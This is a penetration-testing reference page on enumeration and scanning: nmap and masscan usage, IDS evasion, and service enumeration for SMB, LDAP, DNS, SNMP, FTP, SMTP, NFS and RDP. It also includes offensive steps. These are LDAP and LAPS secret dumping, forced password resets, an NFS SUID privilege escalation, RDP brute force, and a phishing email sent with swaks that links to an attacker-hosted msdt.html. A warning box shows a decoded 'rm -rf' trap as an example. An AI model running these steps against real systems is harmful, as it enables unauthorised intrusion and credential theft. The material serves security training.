# Enumeration & Scanning

This is step one of the engagement. Before a single exploit fires, you map what's alive, what's listening, and what version it's running — external attack surface first, then everything the network exposes once you're inside. Everything downstream (web, AD, shells, the report) is built on how well you enumerate here. Slow down and do it properly; a missed UDP port or an unread banner is a missed foothold.

{% hint style="warning" %}
Enumeration is not a one-shot scan. It's a loop: discover hosts → scan ports → identify services/versions → enumerate each service → feed findings back into more scans. When you land creds or an internal foothold, **re-run everything with those creds** — a credentialed view surfaces patch levels, configs, and shares an external scan never sees.
{% endhint %}

## The workflow at a glance

| Phase | Goal | Primary tools |
| --- | --- | --- |
| **Host discovery** | Which hosts are alive? | `nmap -sn`, `fping`, `arp-scan`, `masscan`, `netdiscover` |
| **Port scanning** | Which ports are open? | `nmap`, `masscan`, `rustscan`, `nc` |
| **Service/version ID** | What's running, and what version? | `nmap -sV -sC`, banner grabbing |
| **Service enumeration** | What can each service leak or give up? | per-service tools below |
| **Vuln triage** | What's exploitable, and in what order? | `searchsploit`, NSE `vuln`, CVSS |

***

## Networking Fundamentals (Reference)

Quick refresher on OSI / TCP fields when crafting scan flags or explaining evasion behavior.

**OSI model:**

| # | Layer | Function | Examples |
| - | ------------ | --------------------------------------------------- | -------------------------------------- |
| 7 | Application | Services directly to end-users / apps | HTTP, FTP, IRC, SSH, DNS |
| 6 | Presentation | Data format translation, encryption, compression | SSL/TLS, JPEG, GIF, SSH, IMAP |
| 5 | Session | Manages sessions/connections between apps | APIs, NetBIOS, RPC |
| 4 | Transport | End-to-end communication, flow control | TCP, UDP |
| 3 | Network | Logical addressing and routing | IP, ICMP, IPSec |
| 2 | Data Link | Access to physical medium, framing | Ethernet, PPP, Switches |
| 1 | Physical | Physical connection between devices | USB, Ethernet cable, Coax, Fiber, Hubs |

**TCP 3-way handshake:** Client `SYN` → Server `SYN-ACK` → Client `ACK`. Termination flips `FIN`/`ACK`.

**TCP port ranges:** Well-Known 0-1023 (80 HTTP, 443 HTTPS, 21 FTP, 22 SSH, 25 SMTP, 110 POP3); Registered 1024-49151 (3389 RDP, 3306 MySQL, 8080 HTTP-alt, 27017 MongoDB).

**TCP vs UDP:**

| Feature | UDP | TCP |
| ----------- | --------------------------------- | ------------------------------ |
| Connection | Connectionless | 3-way handshake |
| Reliability | Unreliable, no delivery guarantee | Reliable, ordered, retransmits |
| Examples | DNS, DHCP, SNMP, VoIP, gaming | HTTP, FTP, Telnet, SMTP, HTTPS |

**Reserved IPv4 ranges (RFC 5735):** `0.0.0.0/8` this network; `127.0.0.0/8` loopback; `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` private.

**ICMP echo:** Echo Request = Type 8 / Code 0; Echo Reply = Type 0 / Code 0. **No reply ≠ offline** — could be filtering, congestion, or a firewall dropping ICMP.

**OS estimate via initial TTL:**

```text
TTL 64  = Linux/Unix
TTL 128 = Windows
TTL 255 = Cisco / network equipment
```

***

# Host Discovery

## Ping Sweep (ICMP)

Identify all live hosts on a network without port scanning.

```bash
# fping — fast, quiet, summary
fping -asgq <SUBNET>

# Nmap ping sweep (no port scan)
sudo nmap -sn <SUBNET>

# Nmap ICMP echo with packet trace + reason (explain up/down)
sudo nmap <TARGET> -sn -oA host -PE --packet-trace --disable-arp-ping
sudo nmap <TARGET> -sn -PE --reason

# One-liner extract of live hosts for a targeted follow-up scan
sudo nmap -sn -oA sweep -iL scope.txt | grep for | cut -d" " -f5 > live_hosts.txt

# Bash ping sweep
for i in {1..254}; do (ping -c 1 <NETWORK_PREFIX>.$i | grep "bytes from" &); done

# Windows batch ping sweep
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell ping sweep
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

## ARP Scan (Local Subnet Only)

Most reliable on a local network — Layer 2, can't be firewalled the way ICMP can. Requires direct subnet access.

```bash
# arp-scan the local subnet
sudo arp-scan -l

# nmap ARP scan
sudo nmap -sn -n 192.168.122.0/24

# netdiscover (ARP-based)
sudo netdiscover -i eth0 -r <SUBNET>/24

# Show current ARP neighbors
ip neigh
arp -a
```

## ARP Table Inspection — Hidden Host Discovery

After landing a shell on an internal host, inspect its ARP table to reveal hosts that never answer external/VPN scans due to segmentation.

```bash
# Linux
arp -a
ip neigh show

# Windows
arp -a
Get-NetNeighbor
```

{% hint style="info" %}
Hosts visible in a compromised machine's ARP cache are frequently **invisible** to external nmap sweeps. Always inspect ARP after every internal foothold — it's the cheapest way to find the next hop.
{% endhint %}

## DNS / Domain Controller Discovery

```bash
# Query nameservers
dig ns <DOMAIN> @<DNS_IP>

# Find DHCP/DNS servers via broadcast
sudo nmap --script broadcast-dhcp-discover

# Active Directory SRV records
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain.name>
nslookup -type=srv _kerberos._tcp.<domain.name>
nslookup -type=srv _ldap._tcp.<domain.name>
```

**DC port-signature tell** — a host opening this cluster is a Domain Controller. Pivot straight to [AD enumeration](AD.md):

```text
53  88  135  139  389  445  464  636  3268  3269
= DNS + Kerberos + RPC + NetBIOS + LDAP + kpasswd + Global Catalog  ->  Active Directory
```

## Scanning without Tools (from a foothold)

When nmap isn't available on a compromised host, use built-ins.

```bash
# Bash /dev/tcp port check
for port in 22 80 135 139 443 445 1433 3306 3389 5985 5986 8080; do
  (echo >/dev/tcp/<TARGET>/$port) 2>/dev/null && echo "Port $port OPEN"
done

# Bash ping sweep via /dev/tcp (no ping binary needed)
for i in $(seq 1 254); do
  timeout 1 bash -c "</dev/tcp/<SUBNET>.$i/445" 2>/dev/null && echo "<SUBNET>.$i:445 OPEN" &
done; wait

# Netcat port check + banner grab
for i in {21,22,80,139,443,445,3306,3389,8080,8443}; do
  nc -z -w 1 <TARGET> $i >/dev/null 2>&1 && echo "$i open"
done
nc -nv <TARGET> <PORT>

# Netcat UDP sweep (small range)
nc -nv -u -z -w 1 <TARGET> 120-123
```

```powershell
# PowerShell TCP connect scan (signed built-ins, won't trip AV like nmap.exe)
1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("<TARGET>",$_)) "TCP port $_ open" } 2>$null

# Test-NetConnection
tnc <TARGET> -port 445
Test-NetConnection -ComputerName <TARGET> -Port 445

# From a foothold without nmap
foreach ($port in 22,80,135,139,443,445,1433,3306,3389,5985) {
  $tcp = New-Object System.Net.Sockets.TcpClient
  $result = $tcp.BeginConnect('<TARGET>', $port, $null, $null)
  $result.AsyncWaitHandle.WaitOne(100) | Out-Null
  if ($tcp.Connected) { "Port $port OPEN" }
}
```

{% hint style="success" %}
On a Windows foothold, every command above is signed / built-in — it won't get quarantined the way a dropped `nmap.exe` would.
{% endhint %}

## fscan — Fast Internal Scanner

```bash
./fscan -h <SUBNET>/24
# Open ports, NetBIOS info, web titles, SMB signing, OS info — much faster than nmap internally
```

## Masscan — Ultra-Fast, Large Ranges

```bash
# Top 100 ports across a range, list output
sudo masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp
cat masscan_machines.tmp | grep open | cut -d " " -f4 | sort -u > masscan_machines.lst

# Full TCP+UDP on one host with banners
masscan -e tun0 -p1-65535,U:1-65535 <TARGET> --rate 1000 --banners

# Then feed discovered ports into nmap for accurate version detection
TCP_PORTS=$(cat masscan-ports.lst | grep open | grep tcp | cut -d " " -f3 | tr '\n' ',' | head -c -1)
[ "$TCP_PORTS" ] && sudo nmap -sT -sC -sV -Pn -n -T4 -p$TCP_PORTS --reason -oA nmap_tcp <TARGET>
```

***

# Port Scanning with Nmap

## Nmap Port States

| State | Meaning | Packet indicator |
| ------------ | ---------------------------------------------- | ----------------------------------------------- |
| `open` | Service listening, connection possible | SYN-ACK received (TCP), response received (UDP) |
| `closed` | Port accessible but no service listening | RST received |
| `filtered` | Nmap can't tell open/closed (firewalled) | No response, or ICMP error |
| `unfiltered` | Accessible but open/closed unknown | Only from an ACK scan (`-sA`) |
| `open\|filtered` | No response; could be open or filtered | Common on UDP |
| `closed\|filtered` | Can't tell closed vs filtered | Idle scan |

## The go-to opening scans

```bash
# Fast full TCP SYN sweep, all ports, output to all formats
sudo nmap -sS -p- -T4 --min-rate 5000 <TARGET> -oA full_tcp

# Follow up: version + default scripts on the ports that came back open
sudo nmap -sC -sV -p<OPEN_PORTS> <TARGET> -oA deep_tcp

# Top 100 UDP (never -p- on UDP — it takes hours)
sudo nmap -sU --top-ports 100 <TARGET> -oA udp_top
```

## TCP SYN Scan (Stealth)

Half-open — never completes the handshake. Requires root. The default when run as root.

```bash
sudo nmap -sS -p- -T4 --min-rate 5000 <TARGET> -oA full_tcp
sudo nmap -sS -p22,80,445 <TARGET>
sudo nmap --top-ports=10 <TARGET>
```

| Step | Packet | Flags | Meaning |
| ---- | ------ | -------------- | -------------------------------------------- |
| 1 | SENT | `S` (SYN) | Nmap initiates |
| 2 | RCVD | `SA` (SYN-ACK) | Port is open |
| 3 | SENT | `R` (RST) | Nmap tears down without completing |

Closed port: target immediately sends `RA` (RST-ACK).

## TCP Connect Scan

Full 3-way handshake. No root needed — works through proxychains or from an unprivileged foothold.

```bash
nmap -sT -Pn -p22,80,445 <TARGET>

# Single port with full packet trace
sudo nmap -p 21 --packet-trace -Pn -n --disable-arp-ping <TARGET>
```

**Use `-sT` when:** you lack root, or the firewall drops half-open SYNs but permits completed handshakes.

## UDP Scan

Slow — UDP is connectionless, so nmap waits on timeouts. Essential for DNS, SNMP, TFTP, IKE, SIP.

```bash
sudo nmap -sU -F <TARGET>                    # fast, top 100
sudo nmap -sU --top-ports 50 <TARGET>
sudo nmap -sU -Pn -n --packet-trace -p 137 --reason <TARGET>
```

| Response | State | Meaning |
| -------------------------------------- | ---------- | --------------------------- |
| UDP response | `open` | Service replied with data |
| ICMP Type 3, Code 3 (port unreachable) | `closed` | No service |
| ICMP Type 3, other codes | `filtered` | Firewall blocking |
| No response after retransmissions | `open\|filtered` | Ambiguous |

## Version & OS Detection

```bash
# Service/version detection
sudo nmap -sV -p- <TARGET>

# Version + progress updates (press [Space] during any scan for status)
sudo nmap -p- -sV --stats-every=5s -v <TARGET>

# Aggressive: version + default scripts + OS + traceroute
sudo nmap -sV -sC -O -A <TARGET>
```

### Manual Banner Grabbing

`-sV` sometimes misses what a raw banner reveals.

```bash
nc -nv <TARGET> <PORT>

# Nmap banner script
sudo nmap -sV --script=banner -p <PORT> <TARGET>

# Watch the raw exchange (separate terminal) — PSH-ACK packet carries the banner
sudo tcpdump -i eth0 host <ATTACKER_IP> and <TARGET>
```

## NSE Scripts

| Category | Description | Risk |
| ----------- | ----------------------------------- | --------------- |
| `auth` | Auth credential detection | Safe |
| `broadcast` | Host discovery via broadcast | Safe |
| `brute` | Brute-force login attempts | **Intrusive** |
| `default` | Runs with `-sC` | Safe |
| `discovery` | Service information gathering | Safe |
| `dos` | Denial of service | **Destructive** |
| `exploit` | Attempt known exploits | **Intrusive** |
| `fuzzer` | Send unexpected input | **Intrusive** |
| `intrusive` | May crash / disrupt target | **Intrusive** |
| `safe` | Non-intrusive, non-destructive | Safe |
| `vuln` | Identify specific vulnerabilities | Safe |

```bash
sudo nmap -sC <TARGET>                          # = --script=default
sudo nmap <TARGET> --script <category>
sudo nmap <TARGET> --script banner,smtp-commands -p 25
sudo nmap -sV --script vuln <TARGET>            # vulnerability sweep
```

## Output Formats

```bash
nmap <TARGET> -oN output.nmap        # normal
nmap <TARGET> -oG output.gnmap       # grepable
nmap <TARGET> -oX output.xml         # XML (for reporting / searchsploit)
nmap <TARGET> -oA output_basename    # all three at once
xsltproc output.xml -o output.html   # XML → HTML report
sudo nmap -v -A -iL hosts.txt -oN host-enum
```

### Parsing .gnmap

```bash
grep -E "^Host:" scan.gnmap | awk '{print $2, $3, $4}' | grep -oE "[0-9]+/open"
grep "Status: Up" scan.gnmap | awk '{print $2}'    # live hosts only
```

## Timing & Performance

| Template | Flag | Use case |
| ---------- | ----- | ------------------------------------- |
| Paranoid | `-T0` | IDS evasion, 1 probe / 5 min |
| Sneaky | `-T1` | IDS evasion, 1 probe / 15 s |
| Polite | `-T2` | Reduces network load |
| Normal | `-T3` | Default |
| Aggressive | `-T4` | Fast — recommended for labs |
| Insane | `-T5` | Fastest, may miss ports |

```bash
sudo nmap <TARGET> --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
sudo nmap <TARGET> --max-retries 0
sudo nmap <TARGET> --min-rate 300
sudo nmap -sS -sV -F --host-timeout 5s <TARGET>   # skip slow hosts
sudo nmap -sS -sV -F --scan-delay 5s <TARGET>     # IDS evasion
```

{% hint style="warning" %}
Aggressive timing (`-T4`/`-T5`) plus a high `--min-rate` can cause packet loss and **fewer discovered ports**. On critical targets, compare a fast scan against a default-timing scan before trusting the result.
{% endhint %}

## nmap-services frequency database

`--top-ports N` picks the N most-frequently-open ports from an internet-scan-derived table.

```bash
grep '/tcp' /usr/share/nmap/nmap-services | sort -k3 -r | head -20
# Column 3 is frequency: 0.484143 = ~48% of scanned IPs had http/80 open
```

## Traffic Accounting (how loud is my scan?)

```bash
sudo iptables -I INPUT  1 -s <TARGET> -i tap0 -j ACCEPT
sudo iptables -I OUTPUT 1 -d <TARGET> -o tap0 -j ACCEPT
sudo iptables -Z                          # zero counters
sudo nmap -sS -p- <TARGET>                # run the scan to measure
sudo iptables -vn -L                      # read packet/byte counts
```

Use it to compare `-T3` vs `-T4 --min-rate 5000`, or SYN vs Connect, so you know the real cost.

***

## Firewall & IDS Evasion

### ACK scan — map firewall rules

```bash
sudo nmap -sA -Pn -n --disable-arp-ping --packet-trace -p 21,22,25 <TARGET>
```

`-sA` doesn't tell you open/closed — only filtered vs unfiltered. Diff `-sS` against `-sA` to map the ruleset.

### Decoys, source spoofing, fragmentation

```bash
# Spoof 5 random source IPs alongside yours (decoys MUST be alive on the net)
sudo nmap -sS -D RND:5 -Pn -n --disable-arp-ping -p 80 <TARGET>

# Spoof source IP entirely (responses go to the spoofed host)
sudo nmap -S <SPOOF_IP> -e tun0 -n -Pn -p 445 <TARGET>

# Fragment packets (MTU must be a multiple of 8)
sudo nmap -Pn -n -sS -sV -f --mtu 8 <TARGET>

# Everything at once: fragments + padding + source-port + decoys
sudo nmap -Pn -sS -sV -p445,3389 -f --data-length 200 -g 53 -D <DECOY1>,<DECOY2> <TARGET>
```

### Source-port trust pivot (worked example)

Firewalls often trust a specific source port (53 DNS, 80, 443). Discover *and connect* through it.

```bash
# 1. Find open ports using source-port 53
sudo nmap -g53 --max-retries=1 -Pn -p- --disable-arp-ping <TARGET>
# → e.g. discovers 50000/ibm-db2

# 2. Connect to the discovered service FROM local port 53 so the firewall permits it
sudo nc -s <ATTACKER_IP> -p53 <TARGET> 50000
ncat -nv --source-port 53 <TARGET> 50000     # portable equivalent
```

The allow-rule keys on your **source port** — keep using 53 (or 80/443/25) end-to-end.

### Idle / Zombie scan

```bash
# Verify the zombie has incremental IP-ID sequencing first
sudo nmap -O -v <ZOMBIE_IP> | grep "IP ID"

# Run the idle scan — your IP never appears in the target's logs
nmap -sI <ZOMBIE_IP> <TARGET>
```

### DNS proxying

```bash
sudo nmap --dns-server <DNS_IP>,8.8.8.8 <TARGET>
# In a DMZ the default resolver may not resolve internal names; using the target's DNS reveals them
```

***

# Vulnerability Triage

## searchsploit & Public Exploit Search

After you have service + exact version, before exploitation.

```bash
searchsploit vsftpd                       # by product name
searchsploit -t "Buffer Overflow"         # by vuln type
searchsploit remote windows smb
searchsploit local windows                # privesc exploits
searchsploit -x 45161                     # examine (view) an exploit
searchsploit -m 49757                     # mirror/copy locally
searchsploit --exclude="dos|PoC" vsftpd   # drop noise
searchsploit --nmap scan.xml              # cross-reference every service in an nmap XML
```

Run `sudo nmap -sV -oX scan.xml <TARGET>` first, then `searchsploit --nmap scan.xml` prints matched CVEs per port — the fastest way to triage a wide scan.

### NSE exploit-tagged scripts

```bash
grep -l 'categories.*exploit' /usr/share/nmap/scripts/*.nse
sudo nmap --script smb-vuln-ms17-010 -p 445 <TARGET>
sudo nmap --script "smb-vuln-*"        -p 445 <TARGET>
sudo nmap --script http-shellshock --script-args uri=/cgi-bin/status,cmd=id -p 80 <TARGET>
```

{% hint style="danger" %}
**Always read and decode an exploit before running it.** Public PoCs bury destructive commands in obfuscated byte arrays. An SSH exploit asking for **local** root, or "shellcode" that decodes to `rm -rf ~ /*`, is a trap:

```bash
python3 -c 'print(bytes.fromhex("726d202d7266207e202f2a20323e202f6465762f6e756c6c2026".replace(" ","")).decode())'
# rm -rf ~ /* 2> /dev/null &
```

Decode every embedded array. Trusted sources: Exploit-DB, the Metasploit module DB, GitHub, Packet Storm.
{% endhint %}

### Cross-compiling exploits

```bash
sudo apt-get install mingw-w64 gcc
i686-w64-mingw32-gcc exploit.c -o exploit.exe               # Windows target
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32      # if it needs Winsock
gcc -pthread exploit.c -o exploit -lcrypt                   # Linux target
```

## CVSS Prioritization — what to chase first

| CVSS Base | Rating | Do what |
| --------------- | -------- | -------------------------------------------- |
| 9.0 – 10.0 | Critical | RCE / auth bypass — try immediately |
| 7.0 – 8.9 | High | Missing patches, stored XSS, weak crypto |
| 4.0 – 6.9 | Medium | Config weaknesses, reflected XSS, weak auth |
| 0.1 – 3.9 | Low/Info | Banner/SSL info, dir listing, verbose errors |

**Credentialed re-scan:** once you hold valid SSH/SMB/DB creds, re-check the host — a credentialed view exposes patch level, config, and privilege misconfigs the external scan can't reach.

***

# Service Enumeration

## SMB / CIFS (139, 445)

**NetBIOS** = LAN name/session services (137 Name, 138 Datagram, 139 Session). **SMB** = the file/printer protocol, direct on 445 or over NetBIOS on 139. SMB 1.0 is legacy and vulnerable (EternalBlue); 3.0+ adds encryption.

### Null / guest session enumeration

```bash
smbclient -N -L //<TARGET>              # list shares, no auth
rpcclient -U "" -N <TARGET>             # null RPC session
enum4linux -a <TARGET>
enum4linux-ng <TARGET> -A               # also dumps description fields (admins hide passwords there)
```

**RID cycling fallback** — when the anonymous null session is denied, escalate through guest then SAMR:

```bash
nxc smb <DC_IP> -u '' -p '' --rid-brute          # STATUS_ACCESS_DENIED?
nxc smb <DC_IP> -u 'guest' -p '' --rid-brute     # guest (enabled, blank pw) often works
enum4linux-ng -A <DC_IP>                         # SAMR still enumerates when LDAP is locked
```

### Authenticated enumeration

```bash
smbclient -U '<user>%<pass>' //<TARGET>/<SHARE>
smbmap -u <user> -p <pass> -d <DOMAIN> -H <TARGET>
smbmap -u <user> -p <pass> -H <TARGET> -R <SHARE> --dir-only
sudo nmap <TARGET> -sV -sC -p139,445

# Windows LOLBAS — list shares without dropping smbclient
net view \\<HOSTNAME> /all
```

### CrackMapExec / NetExec

```bash
cme smb <TARGET> -u <user> -p <pass> --shares
cme smb <TARGET> -u <user> -p <pass> --users
cme smb <TARGET> -u <user> -p <pass> --groups
cme smb <TARGET> -u <user> -p <pass> --loggedon-users
cme smb <TARGET> -u <user> -p <pass> --pass-pol
cme smb <TARGET> -u <user> -p <pass> -M spider_plus       # spider shares
cme smb <TARGET> --gen-relay-list relayTargets.txt        # NTLM relay targets
cme smb <TARGET> --shares -u '' -p ''                     # null session
```

### rpcclient (interactive)

```bash
rpcclient -U "" -N <TARGET>
# Inside:
srvinfo             # server info
enumdomusers        # user list
enumdomgroups       # group list
querygroupmem <RID> # group members
queryuser <RID>     # user details
netshareenumall     # shares

# RID brute (500-1100)
for i in $(seq 500 1100); do
  rpcclient -N -U "" <TARGET> -c "queryuser 0x$(printf '%x\n' $i)" | grep -E "User Name|user_rid" && echo ""
done

# Reset another user's password when you hold the ACE (GenericAll / ForceChangePassword edge)
rpcclient -U '<USER>%<PASS>' <TARGET> -c "setuserinfo2 <TARGET_USER> 23 'NewPass123!'"

# Impacket SAM dump
samrdump.py <TARGET>

# Anonymous SID → username brute over SAMR (works on old DCs where enum4linux fails)
impacket-lookupsid -no-pass "<DOMAIN>/ @<DC_IP>"
```

### Useful SMB vuln NSE

```bash
nmap -p 445 --script smb-vuln* <TARGET>
```

* `smb-vuln-ms17-010` — EternalBlue (Win 7/2008)
* `smb-vuln-ms08-067` — legacy, still on ancient boxes
* `smb-vuln-cve-2017-7494` — SambaCry (Linux Samba RCE)
* `smb-double-pulsar-backdoor` — detects the DOUBLEPULSAR implant

**Dangerous smb.conf settings:** `browseable = yes`, `read only = no` / `writable = yes`, `guest ok = yes`, `create mask = 0777`, `logon script` / `magic script` (auto-executed persistence). Review with `cat /etc/samba/smb.conf | grep -v "#\|\;"` and `smbstatus`.

### profiles$ share — username harvest

Roaming-profile deployments expose folder names = domain usernames.

```bash
smbclient -U '<USER>%<PASS>' //<TARGET>/profiles$ -c 'ls' 2>/dev/null \
  | awk '{print $1}' | grep -v "^\." | grep -v "blocks" > users.txt
```

## LDAP (389, 636)

### Anonymous bind

```bash
# Naming contexts
ldapsearch -x -H ldap://<TARGET> -s base namingcontexts

# Users
ldapsearch -x -H ldap://<TARGET> -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=user)" sAMAccountName

# DO THIS FIRST on any DC — dump everything, grep the free-text fields where admins leave secrets
ldapsearch -x -H ldap://<TARGET> -b "DC=<DOMAIN>,DC=<TLD>" \
  | grep -i 'description\|info\|userPassword\|pwd\|pass'

# LAPS local-admin password via raw attribute read
ldapsearch -x -H ldap://<TARGET> -D '<USER>@<DOMAIN>' -w '<PASS>' \
  -b "DC=<DOMAIN>,DC=<TLD>" ms-Mcs-AdmPwd msLAPS-Password
```

### Authenticated & tooling

```bash
ldapsearch -x -H ldap://<TARGET> -D "user@domain" -w '<pass>' -b "DC=<DOMAIN>,DC=<TLD>"

# windapsearch
python3 windapsearch.py --dc-ip <TARGET> -u "" -U          # users, unauth
python3 windapsearch.py --dc-ip <TARGET> -u user -p pass --da    # domain admins
python3 windapsearch.py --dc-ip <TARGET> -u user -p pass -PU     # privileged users

# CrackMapExec LDAP
cme ldap <TARGET> -u <user> -p <pass> --users
cme ldap <TARGET> -u <user> -p <pass> --password-not-required
cme ldap <TARGET> -u <user> -p <pass> --trusted-for-delegation
cme ldap <TARGET> -u <user> -p <pass> --get-sid
cme ldap <TARGET> -u <user> -p <pass> -M laps
cme ldap <TARGET> -u <user> -p <pass> --asreproast asrep.out
cme ldap <TARGET> -u <user> -p <pass> --kerberoasting kerb.out
```

See [Active Directory](AD.md) and [AD Attacks](ad-attacks.md) for the full domain flow.

## DNS (53)

### Zone transfer

Often misconfigured internally — dumps the entire zone in one request.

```bash
dig axfr @<DNS_IP> <DOMAIN>
dig axfr @<DNS_IP> internal.<DOMAIN>
```

### Subdomain / record enumeration

```bash
# dnsenum
dnsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o subdomains.txt \
  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <DOMAIN>

# gobuster DNS
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r <DNS_IP> -i -t 100

# Records
dig ns  <DOMAIN> @<DNS_IP>
dig any <DOMAIN> @<DNS_IP>
dig -x <TARGET> @<DNS_IP>                    # reverse lookup
dig CH TXT version.bind <DNS_IP>             # BIND version

# AD DNS dump via LDAP
adidnsdump -u <DOMAIN>\\<USER> ldap://<DC_IP> -r
```

**Preprod vhost pattern:** a zone transfer often reveals `dev-*` / `preprod-*` CNAMEs — then vhost-fuzz them:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://<TARGET> -H "Host: preprod-FUZZ.<DOMAIN>" -fs 5480
```

More web-side host discovery in [Web Enumeration](web-enumeration.md).

## SNMP (UDP 161)

| Version | Security |
| ----------- | ----------------------------- |
| **v1** | None — plaintext everything |
| **v2c** | Community string (plaintext) |
| **v3** | User auth + encryption |

```bash
sudo nmap <TARGET> -sU -p 161 --script snmp*
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <TARGET>   # community brute
snmpwalk -v2c -c public <TARGET>                     # dump the whole MIB
braa public@<TARGET>:.1.3.6.*                        # fast mass OID query

# Net-SNMP extend/exec scripts frequently leak command output, paths, creds
snmpwalk -v2c -c public <TARGET> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

### High-value Windows OIDs (faster than a full walk)

| OID | Returns |
| -------------------------- | --------------------------------- |
| `1.3.6.1.2.1.1.5.0` | Hostname |
| `1.3.6.1.4.1.77.1.2.25` | Windows local users |
| `1.3.6.1.2.1.25.4.2.1.2` | Running processes |
| `1.3.6.1.2.1.25.4.2.1.4` | Full path of each process |
| `1.3.6.1.2.1.25.6.3.1.2` | Installed software |
| `1.3.6.1.2.1.6.13.1.3` | Listening TCP ports |
| `1.3.6.1.2.1.4.20.1.1` | Network interfaces (IPs) |

```bash
snmpwalk -v2c -c public <TARGET> 1.3.6.1.4.1.77.1.2.25   # users
snmpwalk -v2c -c public <TARGET> 1.3.6.1.2.1.25.6.3.1.2  # installed software
```

**Dangerous settings:** `rwuser noauth`, `rwcommunity <string> <source>` (full tree from any source).

## FTP (21)

```bash
ftp <TARGET>                                  # anonymous / (blank or email)
wget -m --no-passive "ftp://anonymous:anonymous@<TARGET>"    # mirror everything
nmap --script ftp-anon -p 21 <TARGET>
sudo nmap -sV -p21 -sC -A <TARGET>
openssl s_client -connect <TARGET>:21 -starttls ftp         # FTPS cert inspection

# ftp interactive helpers
ftp> ls -R
ftp> get <file> -           # download to stdout (read without saving)
```

After mirroring, hunt for secrets:

```bash
grep -ri "password\|passwd\|credential\|secret" ./ftp_dump/ 2>/dev/null
find ./ftp_dump/ -name "*.conf" -o -name "*.cfg" -o -name "*.bak" 2>/dev/null
strings Umbraco.sdf | grep -i "admin\|password"   # Umbraco creds = SHA1, crack with hashcat -m 100
```

**vsFTPd dangerous settings:** `anonymous_enable=YES`, `anon_upload_enable=YES`, `anon_mkdir_write_enable=YES`, `write_enable=YES`. Blocked accounts: `/etc/ftpusers`.

### TFTP (UDP 69)

No auth, no listing — you must know or guess filenames. Common targets: PXE stores, router/switch backups.

```bash
sudo nmap -sU -p69 --script tftp-enum --script-args "tftp-enum.filelist=/path/list.txt" <TARGET>

# atftp
atftp -g -r pxelinux.0 -l ./pxelinux.0 <TARGET>       # GET
atftp -p -r upload.bin -l ./upload.bin <TARGET>       # PUT
```

**PXE filename list to try:** `pxelinux.0`, `pxelinux.cfg/default`, `undionly.kpxe`, `grub.cfg`, `startup-config`, `running-config`, `router-confg`, `network-confg`.

## SSH (22)

```bash
ssh-audit <TARGET>                                            # weak algos, config issues
ssh -v <user>@<TARGET> -o PreferredAuthentications=password   # force password auth
ssh -i key_file <user>@<TARGET>

# Fix "Too many authentication failures" — offer ONLY the given key
ssh -o IdentitiesOnly=yes -i key <user>@<TARGET>

# Connect to a LEGACY sshd rejecting modern algorithms
ssh -oHostKeyAlgorithms=+ssh-rsa \
    -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oPubkeyAcceptedAlgorithms=+ssh-rsa <user>@<TARGET>
```

**Dangerous sshd_config:** `PermitRootLogin yes`, `PasswordAuthentication yes`, `PermitEmptyPasswords yes`, `Protocol 1`, `X11Forwarding yes`.

## SMTP (25, 465, 587)

### User enumeration

```bash
smtp-user-enum -M VRFY -U users.txt -t <TARGET>
smtp-user-enum -M RCPT -D <DOMAIN> -U users.txt -t <TARGET>   # RCPT confirms address format

telnet <TARGET> 25
VRFY <username>
EXPN <group>
```

| Code | Meaning |
| ----- | ---------------------------------------------------- |
| `250` | User confirmed valid |
| `252` | Will accept mail but won't confirm — still reveals syntax |
| `550` | User does not exist (or VRFY disabled) |

### Banner, TLS, relay

```bash
printf "QUIT\r\n" | nc -nv <TARGET> 25
openssl s_client -connect <TARGET>:25 -starttls smtp
sudo nmap <TARGET> -sC -sV -p25 --script smtp-open-relay,smtp-commands

# External-from relay bypass (hMailServer / some Postfix — auth only required for local-domain FROM)
swaks --to itsupport@<DOMAIN> --from "attacker@evil.htb" --server <TARGET> \
      --header "Subject: Internal web app" --body "http://<ATTACKER_IP>/msdt.html"
```

### Manual email via telnet

```bash
telnet <TARGET> 25
HELO <ATTACKER_DOMAIN>
MAIL FROM: <SENDER>@<ATTACKER_DOMAIN>
RCPT TO: <RECIPIENT>@<TARGET_DOMAIN>
DATA
Subject: <SUBJECT>
<MESSAGE_BODY>
.
QUIT
```

**Dangerous (Postfix):** open relay via `mynetworks = 0.0.0.0/0`. Config: `/etc/postfix/main.cf`.

## NFS (111, 2049)

No built-in auth — relies on UID/GID mapping.

```bash
sudo nmap --script nfs* <TARGET> -sV -p111,2049
showmount -e <TARGET>                                     # list exports
sudo mount -t nfs <TARGET>:/<share> /mnt/nfs -o nolock
ls -n /mnt/nfs/                                            # numeric UID/GID mapping
sudo umount /mnt/nfs
```

**Dangerous settings:** `no_root_squash` (client root = server root), `insecure`, `rw`. Review with `cat /etc/exports` and `exportfs`.

**Username harvest + UID bypass:** folder names under home exports = usernames. If a read is denied by UID mismatch, create a matching local user:

```bash
sudo useradd -u <UID> -s /bin/bash tempuser
sudo -u tempuser ls -la /mnt/nfs/<USER>/
```

**Priv-esc:** with `no_root_squash`, mount as root, drop a SUID binary owned by the target user, execute it over SSH as that user. Windows NFS exports (e.g. `/site_backups`) frequently hide a CMS DB or `wp-config.php`.

## RDP (3389)

```bash
xfreerdp /u:<user> /p:<pass> /v:<TARGET> /dynamic-resolution
xfreerdp /u:<user> /p:<pass> /v:<TARGET> /drive:share,/tmp     # drive redirection
cme rdp <TARGET> -u <user> -p <pass> --screenshot
nmap -sV -sC <TARGET> -p3389 --script rdp*
crowbar -b rdp -s <TARGET>/32 -U users.txt -C passwords.txt -n 1   # brute-force
```

